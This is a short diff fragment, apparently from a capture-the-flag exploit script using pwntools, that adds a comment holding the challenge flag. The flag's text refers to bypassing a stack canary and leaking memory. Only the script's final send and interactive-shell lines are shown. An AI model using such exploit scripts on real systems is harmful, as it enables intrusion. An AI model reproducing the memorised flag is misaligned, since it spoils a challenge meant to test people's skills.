@@ -43,3 +43,4 @@ payload = flat(
 p.sendline(payload)
 p.interactive()
 
+#v1t{y0u_s1l3nc3d_th3_c4n4ry_4nd_f0und_th3_r34l_l34k_4nd_g0t_y0ur_s3cr3t_59bcc3ad6775562f845953cf01624225}
